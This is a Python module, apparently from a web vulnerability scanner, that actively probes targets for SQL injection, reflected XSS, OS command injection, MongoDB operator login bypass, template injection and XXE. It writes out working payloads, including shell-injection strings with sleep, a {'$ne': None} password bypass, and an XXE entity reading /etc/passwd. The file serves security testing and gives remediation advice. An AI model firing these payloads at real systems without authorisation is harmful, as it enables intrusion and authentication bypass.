"""
VENOM AI — A05 Injection Attack Engine
─────────────────────────────────────────────────────────────────────────
Real active injection testing:
  • SQL Injection (error-based, boolean-blind, time-based)
  • Reflected XSS
  • OS Command Injection (timing oracle)
  • NoSQL Injection (MongoDB $where, $ne, $gt operators)
  • Server-Side Template Injection (SSTI — Jinja2, Twig, Freemarker)
  • LDAP Injection
  • XXE on XML endpoints

INPUT  : list of attack targets (URL + params, or form + inputs)
OUTPUT : list of Finding objects (verified or probable)

ALL payloads are SAFE — they detect by reflection/error/timing, not by
modifying data. No DROP TABLE, no DELETE, no eval(rm -rf), etc.
"""
from __future__ import annotations

import re
import time
import logging
from typing import List, Optional, Dict
from urllib.parse import urlparse, parse_qsl

from .common import AttackClient, Finding, inject_into_url, timed_request

logger = logging.getLogger("venom.attack.a05")


# ════════════════════════════════════════════════════════════════════════════
# SQL INJECTION
# ════════════════════════════════════════════════════════════════════════════

# Database error fingerprints (case-insensitive substrings)
SQL_ERROR_SIGNATURES = [
    # MySQL
    ("you have an error in your sql syntax", "MySQL"),
    ("warning: mysql",                       "MySQL"),
    ("mysql_fetch_",                         "MySQL"),
    ("mysql_num_rows",                       "MySQL"),
    # PostgreSQL
    ("pg_query()",                           "PostgreSQL"),
    ("postgresql query failed",              "PostgreSQL"),
    ("unterminated quoted string",           "PostgreSQL"),
    # Oracle
    ("ora-00933",                            "Oracle"),
    ("ora-00921",                            "Oracle"),
    ("ora-01756",                            "Oracle"),
    # MSSQL
    ("microsoft sql server",                 "MSSQL"),
    ("unclosed quotation mark",              "MSSQL"),
    ("incorrect syntax near",                "MSSQL"),
    # SQLite
    ("sqlite_exception",                     "SQLite"),
    ("sqlite3.operationalerror",             "SQLite"),
    # Generic
    ("sql syntax",                           "Generic SQL"),
    ("syntax error in",                      "Generic SQL"),
    ("odbc driver",                          "ODBC"),
]


def _detect_sql_error(body: str) -> Optional[str]:
    """Return DB name if body contains a SQL error signature."""
    b = (body or "").lower()
    for sig, db in SQL_ERROR_SIGNATURES:
        if sig in b:
            return db
    return None


def test_sql_injection(client: AttackClient, url: str, param: str,
                       original_value: str = "1") -> List[Finding]:
    """
    Test a single URL parameter for SQL injection using 3 techniques:
      1. Error-based — inject single quote, look for SQL error in response
      2. Boolean-based — compare TRUE vs FALSE response sizes
      3. Time-based — inject SLEEP(5), measure response delay
    """
    findings: List[Finding] = []

    # Get baseline (control response)
    baseline = client.get(inject_into_url(url, param, original_value))
    if not baseline:
        return findings
    baseline_len = len(baseline.text or "")

    # ─── 1. ERROR-BASED ────────────────────────────────────────────────────
    for payload in ("'", "''", "\\'", "' OR '1'='1", "1'"):
        injected_url = inject_into_url(url, param, payload)
        r = client.get(injected_url)
        if not r:
            continue
        db = _detect_sql_error(r.text or "")
        if db:
            findings.append(Finding(
                title=f"SQL Injection ({db}) — Error-Based",
                category="vulnerability",
                owasp="A05",
                severity="critical",
                cwe_id="CWE-89",
                cvss_score=9.8,
                affected_url=injected_url,
                parameter=param,
                http_method="GET",
                payload=payload,
                evidence=f"Response contains {db} error signature when payload injected",
                description=(
                    f"The parameter '{param}' is vulnerable to SQL injection. "
                    f"Injecting a SQL meta-character ({payload!r}) triggered a "
                    f"{db} database error to be returned in the HTTP response, "
                    f"proving the input is concatenated into a SQL query."
                ),
                impact=(
                    "An attacker can read, modify or delete arbitrary database "
                    "records, potentially exposing all user data and credentials."
                ),
                recommendation=(
                    "Use parameterised queries / prepared statements. Never "
                    "concatenate user input into SQL. Apply input validation "
                    "and least-privilege DB accounts."
                ),
                poc=f"curl '{injected_url}'",
                verified=True,
                likelihood=5, impact_score=5, risk_score=25,
            ))
            return findings   # one confirmation is enough for this param

    # ─── 2. BOOLEAN-BASED (compare TRUE vs FALSE) ──────────────────────────
    true_payload  = f"{original_value} AND 1=1"
    false_payload = f"{original_value} AND 1=2"
    r_true  = client.get(inject_into_url(url, param, true_payload))
    r_false = client.get(inject_into_url(url, param, false_payload))
    if r_true and r_false:
        len_true  = len(r_true.text or "")
        len_false = len(r_false.text or "")
        # If TRUE matches baseline closely and FALSE differs significantly → blind SQLi
        delta_true  = abs(len_true  - baseline_len)
        delta_false = abs(len_false - baseline_len)
        if delta_true < 50 and delta_false > 200 and r_true.status_code == r_false.status_code:
            findings.append(Finding(
                title="SQL Injection — Boolean-Based Blind",
                category="vulnerability",
                owasp="A05",
                severity="high",
                cwe_id="CWE-89",
                cvss_score=8.6,
                affected_url=inject_into_url(url, param, true_payload),
                parameter=param,
                http_method="GET",
                payload=f"AND 1=1 vs AND 1=2",
                evidence=(
                    f"Response sizes differ significantly: "
                    f"TRUE condition → {len_true} bytes (baseline {baseline_len}), "
                    f"FALSE condition → {len_false} bytes"
                ),
                description=(
                    f"The parameter '{param}' is vulnerable to boolean-based "
                    "blind SQL injection. Different responses for TRUE vs FALSE "
                    "conditions allow an attacker to extract data one bit at a time."
                ),
                impact="Attacker can exfiltrate data character-by-character via boolean probing.",
                recommendation="Use parameterised queries. Input validation alone is insufficient.",
                poc=f"# TRUE:  {inject_into_url(url, param, true_payload)}\n# FALSE: {inject_into_url(url, param, false_payload)}",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))

    # ─── 3. TIME-BASED (cautious — only 1 attempt, 4s sleep) ───────────────
    # Try MySQL SLEEP — if response takes >3.5s and baseline was <1s, vulnerable
    if baseline.elapsed.total_seconds() < 1.2:
        sleep_payload = f"{original_value}' AND SLEEP(4)-- -"
        r_sleep, elapsed = timed_request(client, "GET",
                                          inject_into_url(url, param, sleep_payload))
        if r_sleep and 3.5 < elapsed < 8.0:
            findings.append(Finding(
                title="SQL Injection — Time-Based Blind",
                category="vulnerability",
                owasp="A05",
                severity="critical",
                cwe_id="CWE-89",
                cvss_score=9.1,
                affected_url=inject_into_url(url, param, sleep_payload),
                parameter=param,
                http_method="GET",
                payload=sleep_payload,
                evidence=f"Response delayed {elapsed:.2f}s after injecting SLEEP(4)",
                description="Time-based blind SQL injection confirmed via SLEEP() delay oracle.",
                impact="Same as boolean-blind: full data exfiltration possible, just slower.",
                recommendation="Use parameterised queries. Set DB query timeouts.",
                poc=f"curl '{inject_into_url(url, param, sleep_payload)}' # ~4s delay confirms",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))

    return findings


# ════════════════════════════════════════════════════════════════════════════
# REFLECTED XSS
# ════════════════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    "<script>venompayload()</script>",
    '"><svg onload=venompayload()>',
    "'><img src=x onerror=venompayload()>",
    "javascript:venompayload()",
    "<iframe src=javascript:venompayload()>",
]

# Marker tokens to detect — unique enough to avoid false positives
XSS_MARKERS = ["venompayload", "<svg onload=", "onerror="]


def test_reflected_xss(client: AttackClient, url: str, param: str,
                        original_value: str = "test") -> List[Finding]:
    findings: List[Finding] = []
    for payload in XSS_PAYLOADS:
        injected = inject_into_url(url, param, payload)
        r = client.get(injected)
        if not r or not r.text:
            continue
        body = r.text
        ctype = (r.headers.get("content-type") or "").lower()
        # Only HTML responses can reflect XSS
        if "html" not in ctype and "text" not in ctype:
            continue
        # Look for payload literally in response (unencoded)
        if payload in body:
            # Confirm it's actually in a dangerous context (not e.g. inside a comment)
            findings.append(Finding(
                title="Reflected Cross-Site Scripting (XSS)",
                category="vulnerability",
                owasp="A05",
                severity="high",
                cwe_id="CWE-79",
                cvss_score=8.1,
                affected_url=injected,
                parameter=param,
                http_method="GET",
                payload=payload,
                evidence=f"Payload reflected verbatim in response body: {payload[:60]}",
                description=(
                    f"The parameter '{param}' reflects user input into the response "
                    "without HTML encoding. This allows an attacker to inject "
                    "JavaScript that executes in any victim's browser."
                ),
                impact=(
                    "Attacker can steal session cookies, perform actions as the "
                    "victim, deface the page, or redirect to phishing sites."
                ),
                recommendation=(
                    "Encode all user-supplied data before output (use templating "
                    "engine's auto-escape). Apply a strict Content-Security-Policy."
                ),
                poc=f"# Visit in browser:\n{injected}",
                verified=True,
                likelihood=4, impact_score=4, risk_score=16,
            ))
            return findings   # one XSS proof per parameter is enough
    return findings


# ════════════════════════════════════════════════════════════════════════════
# OS COMMAND INJECTION
# ════════════════════════════════════════════════════════════════════════════

# Time-based payloads (most reliable — works even when output is suppressed)
CMD_INJECTION_PAYLOADS = [
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "; ping -c 4 127.0.0.1",
]


def test_command_injection(client: AttackClient, url: str, param: str,
                            original_value: str = "test") -> List[Finding]:
    findings: List[Finding] = []
    # Baseline timing
    baseline = client.get(inject_into_url(url, param, original_value))
    if not baseline:
        return findings
    baseline_t = baseline.elapsed.total_seconds()
    if baseline_t > 2.0:   # baseline already too slow — skip timing-based
        return findings

    for payload in CMD_INJECTION_PAYLOADS:
        # Append payload to original value
        test_value = f"{original_value}{payload}"
        r, elapsed = timed_request(client, "GET", inject_into_url(url, param, test_value))
        if r is None:
            continue
        if 4.5 < elapsed < 8.0:
            findings.append(Finding(
                title="OS Command Injection (Time-Based)",
                category="vulnerability",
                owasp="A05",
                severity="critical",
                cwe_id="CWE-78",
                cvss_score=9.8,
                affected_url=inject_into_url(url, param, test_value),
                parameter=param,
                http_method="GET",
                payload=payload,
                evidence=f"Response delayed {elapsed:.2f}s (baseline {baseline_t:.2f}s) after injecting shell sleep",
                description=(
                    f"The parameter '{param}' passes user input to a shell command "
                    "without sanitisation. Injecting a shell metacharacter and "
                    "sleep() caused a measurable response delay, proving the "
                    "shell executed our payload."
                ),
                impact=(
                    "Attacker has full OS command execution on the server. "
                    "Complete system compromise is trivial from here."
                ),
                recommendation=(
                    "Never pass user input to shell. Use language-native APIs "
                    "(e.g. subprocess with arg list, never shell=True). "
                    "If shell is unavoidable, use strict allowlist validation."
                ),
                poc=f"curl '{inject_into_url(url, param, test_value)}'",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))
            return findings
    return findings


# ════════════════════════════════════════════════════════════════════════════
# NOSQL INJECTION (MongoDB)
# ════════════════════════════════════════════════════════════════════════════

NOSQL_PAYLOADS_JSON = [
    {"$ne":  None},
    {"$gt":  ""},
    {"$ne":  "x"},
    {"$regex": ".*"},
]


def test_nosql_injection_form(client: AttackClient, form_action: str,
                               method: str, base_data: dict,
                               injection_field: str) -> List[Finding]:
    """
    Try MongoDB operator injection on a form field.
    Most useful on login forms — sending {"$ne": null} as password often bypasses auth.
    """
    findings: List[Finding] = []

    # Get baseline response with normal data
    baseline = client.request(method, form_action, data=base_data)
    if not baseline:
        return findings

    for payload in NOSQL_PAYLOADS_JSON:
        # Use JSON body — most NoSQL-injectable APIs accept JSON
        test_data = dict(base_data)
        test_data[injection_field] = payload
        r = client.request(method, form_action, json=test_data)
        if not r:
            continue
        # Look for sign of auth bypass: redirect, set-cookie, or significantly different body
        bypass_signals = []
        if r.status_code != baseline.status_code:
            bypass_signals.append(f"Status code changed: {baseline.status_code} → {r.status_code}")
        if "set-cookie" in r.headers and "set-cookie" not in baseline.headers:
            bypass_signals.append("Session cookie set after injection")
        # Successful login often returns 200 with different body length
        if r.status_code == 200 and abs(len(r.text) - len(baseline.text)) > 300:
            bypass_signals.append(f"Body size changed: {len(baseline.text)} → {len(r.text)} bytes")

        if len(bypass_signals) >= 2:
            findings.append(Finding(
                title="NoSQL Injection (MongoDB Operator)",
                category="vulnerability",
                owasp="A05",
                severity="critical",
                cwe_id="CWE-943",
                cvss_score=9.4,
                affected_url=form_action,
                parameter=injection_field,
                http_method=method,
                payload=str(payload),
                evidence=f"Injection bypass signals: {'; '.join(bypass_signals)}",
                description=(
                    f"The form field '{injection_field}' accepts JSON and is "
                    "passed to a NoSQL query without filtering. Injecting a "
                    "MongoDB operator like $ne or $gt bypasses the intended check."
                ),
                impact="Authentication bypass, data exfiltration via blind operators.",
                recommendation=(
                    "Sanitize input — reject any object/array values. Cast inputs "
                    "to expected primitive types (string for password, etc.) before "
                    "passing to query."
                ),
                poc=f"curl -X {method} '{form_action}' -H 'Content-Type: application/json' -d '{{\"{injection_field}\": {payload}}}'",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))
            return findings
    return findings


# ════════════════════════════════════════════════════════════════════════════
# SERVER-SIDE TEMPLATE INJECTION (SSTI)
# ════════════════════════════════════════════════════════════════════════════

# Math-based detection — if "49" appears in response, template engine evaluated 7*7
SSTI_PAYLOADS = [
    ("{{7*7}}",       "49", "Jinja2/Twig/Liquid"),
    ("${7*7}",        "49", "FreeMarker/Velocity/JSP EL"),
    ("#{7*7}",        "49", "Ruby/Spring/Smarty"),
    ("<%= 7*7 %>",    "49", "Ruby ERB/Java JSP"),
    ("{{7*'7'}}",     "7777777", "Jinja2 (string mult)"),
]


def test_ssti(client: AttackClient, url: str, param: str,
              original_value: str = "test") -> List[Finding]:
    findings: List[Finding] = []
    # Get baseline to ensure 49 isn't normally in the page
    baseline = client.get(inject_into_url(url, param, original_value))
    if not baseline or not baseline.text:
        return findings
    baseline_text = baseline.text

    for payload, expected, engine in SSTI_PAYLOADS:
        if expected in baseline_text:
            continue   # already there, skip — too noisy
        injected = inject_into_url(url, param, payload)
        r = client.get(injected)
        if not r or not r.text:
            continue
        if expected in r.text and payload not in r.text:
            # Math evaluated AND the original payload isn't reflected raw → SSTI
            findings.append(Finding(
                title=f"Server-Side Template Injection ({engine})",
                category="vulnerability",
                owasp="A05",
                severity="critical",
                cwe_id="CWE-1336",
                cvss_score=9.8,
                affected_url=injected,
                parameter=param,
                http_method="GET",
                payload=payload,
                evidence=f"Template expression evaluated: '{payload}' produced '{expected}' in response",
                description=(
                    f"The parameter '{param}' is rendered through a server-side "
                    f"template engine ({engine}) without sandboxing. An attacker "
                    f"can inject template expressions that execute on the server, "
                    f"often leading to remote code execution."
                ),
                impact="Remote code execution on the server is typically achievable.",
                recommendation=(
                    "Never pass user input directly into a template. Use the "
                    "engine's safe-rendering mode or escape all user data. Run "
                    "templates in a sandboxed environment."
                ),
                poc=f"curl '{injected}'   # Body contains '{expected}'",
                verified=True,
                likelihood=4, impact_score=5, risk_score=20,
            ))
            return findings
    return findings


# ════════════════════════════════════════════════════════════════════════════
# XXE (XML External Entity)
# ════════════════════════════════════════════════════════════════════════════

XXE_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""


def test_xxe(client: AttackClient, url: str, method: str = "POST") -> List[Finding]:
    """Send an XML payload referencing /etc/passwd — look for root: in response."""
    findings: List[Finding] = []
    headers = {"Content-Type": "application/xml"}
    r = client.request(method, url, content=XXE_PAYLOAD, headers=headers)
    if not r or not r.text:
        return findings
    # Successful XXE returns /etc/passwd content (looks like "root:x:0:0:...")
    if re.search(r"root:[^:]*:0:0:", r.text):
        findings.append(Finding(
            title="XML External Entity (XXE) Injection",
            category="vulnerability",
            owasp="A05",
            severity="critical",
            cwe_id="CWE-611",
            cvss_score=9.4,
            affected_url=url,
            http_method=method,
            payload=XXE_PAYLOAD[:120] + "...",
            evidence="Response contains /etc/passwd content (root:x:0:0:...)",
            description=(
                "The endpoint parses XML with external entity processing enabled. "
                "An attacker can include external entities to read arbitrary files, "
                "make SSRF requests, or cause denial of service."
            ),
            impact="Local file disclosure, SSRF, denial of service, occasionally RCE.",
            recommendation=(
                "Disable external entity and DTD processing in the XML parser. "
                "For libxml: LIBXML_NOENT off, LIBXML_DTDLOAD off. "
                "For lxml: resolve_entities=False, no_network=True."
            ),
            poc=f"curl -X {method} '{url}' -H 'Content-Type: application/xml' -d @xxe.xml",
            verified=True,
            likelihood=4, impact_score=5, risk_score=20,
        ))
    return findings


# ════════════════════════════════════════════════════════════════════════════
# PUBLIC API — run all A05 tests on a target plan
# ════════════════════════════════════════════════════════════════════════════

def run_a05_engine(plan: dict, endpoints: List[dict], forms: List[dict],
                    max_rps: float = 10.0) -> List[Finding]:
    """
    Run all A05 (Injection) tests against the plan's targets.
    Returns flat list of Findings.
    """
    findings: List[Finding] = []
    client = AttackClient(max_rps=max_rps)
    try:
        # ── Test URL parameters from API endpoints ─────────────────────────
        for ep in endpoints:
            url = ep.get("url", "")
            params = ep.get("parameters") or []
            if not url or not params:
                continue
            # Parse existing param values to use as original_value
            parsed_qs = dict(parse_qsl(urlparse(url).query))
            for p in params:
                orig = parsed_qs.get(p, "1")
                findings += test_sql_injection(client, url, p, orig)
                findings += test_reflected_xss(client, url, p, orig)
                findings += test_command_injection(client, url, p, orig)
                findings += test_ssti(client, url, p, orig)

        # ── Test form inputs ───────────────────────────────────────────────
        for form in forms:
            action = form.get("action", "")
            method = (form.get("method") or "POST").upper()
            inputs = form.get("inputs", [])
            if not action or not inputs:
                continue
            # Build baseline data with safe default values
            base = {}
            for i in inputs:
                t = (i.get("type") or "").lower()
                base[i["name"]] = {
                    "email":    "test@venomscan.example",
                    "password": "TestPass123!",
                    "number":   "1",
                }.get(t, "test")

            # NoSQL injection on login-like forms
            purpose = form.get("purpose")
            if purpose in ("login", "signup"):
                # Find first non-CSRF input that isn't password
                for i in inputs:
                    iname = i.get("name", "")
                    if "csrf" in iname.lower() or "token" in iname.lower():
                        continue
                    findings += test_nosql_injection_form(
                        client, action, method, base, iname)
                    break

            # XXE on form action if enctype suggests XML
            enctype = (form.get("enctype") or "").lower()
            if "xml" in enctype:
                findings += test_xxe(client, action, method)

            # SQLi / XSS / SSTI on each text input via direct field replacement
            for i in inputs:
                t = (i.get("type") or "").lower()
                iname = i.get("name", "")
                if t not in ("text", "search", "email", "url", "textarea", ""):
                    continue
                if "csrf" in iname.lower():
                    continue
                # Inject one field at a time using form POST
                for engine_name, payloads, test_fn in [
                    ("sqli", ["'"], "sqli"),
                    ("xss",  XSS_PAYLOADS[:1], "xss"),
                    ("ssti", ["{{7*7}}"], "ssti"),
                ]:
                    for payload in payloads:
                        test_data = dict(base)
                        test_data[iname] = payload
                        r = client.request(method, action, data=test_data)
                        if not r:
                            continue
                        body = r.text or ""
                        if engine_name == "sqli":
                            db = _detect_sql_error(body)
                            if db:
                                findings.append(Finding(
                                    title=f"SQL Injection ({db}) — Form-Based",
                                    category="vulnerability",
                                    owasp="A05",
                                    severity="critical",
                                    cwe_id="CWE-89", cvss_score=9.8,
                                    affected_url=action, parameter=iname,
                                    http_method=method, payload=payload,
                                    evidence=f"{db} error returned after submitting {payload!r} in {iname}",
                                    description=f"Form field '{iname}' is unsafely concatenated into a {db} query.",
                                    impact="Database compromise possible.",
                                    recommendation="Use parameterised queries.",
                                    poc=f"# POST {action}\n# data: {iname}={payload}",
                                    verified=True,
                                    likelihood=5, impact_score=5, risk_score=25,
                                ))
                                break
                        elif engine_name == "xss":
                            ctype = (r.headers.get("content-type") or "").lower()
                            if "html" in ctype and payload in body:
                                findings.append(Finding(
                                    title="Reflected XSS — Form Submission",
                                    category="vulnerability",
                                    owasp="A05",
                                    severity="high",
                                    cwe_id="CWE-79", cvss_score=8.1,
                                    affected_url=action, parameter=iname,
                                    http_method=method, payload=payload,
                                    evidence=f"Payload reflected in response after form submission",
                                    description=f"Form field '{iname}' is reflected without escaping.",
                                    impact="Stored or reflected XSS attack possible.",
                                    recommendation="HTML-encode all output.",
                                    poc=f"# POST {action}\n# {iname}={payload}",
                                    verified=True,
                                    likelihood=4, impact_score=4, risk_score=16,
                                ))
                                break
                        elif engine_name == "ssti":
                            if "49" in body and payload not in body:
                                findings.append(Finding(
                                    title="SSTI — Form Submission",
                                    category="vulnerability",
                                    owasp="A05",
                                    severity="critical",
                                    cwe_id="CWE-1336", cvss_score=9.8,
                                    affected_url=action, parameter=iname,
                                    http_method=method, payload=payload,
                                    evidence="Template expression evaluated server-side",
                                    description="Form input rendered through unsafe template engine.",
                                    impact="Remote code execution likely.",
                                    recommendation="Never pass user input into template strings.",
                                    poc=f"# POST {action}\n# {iname}={{7*7}} → returns 49",
                                    verified=True,
                                    likelihood=4, impact_score=5, risk_score=20,
                                ))
                                break
    finally:
        client.close()

    logger.info(f"[A05] Found {len(findings)} injection vulnerabilities")
    return findings
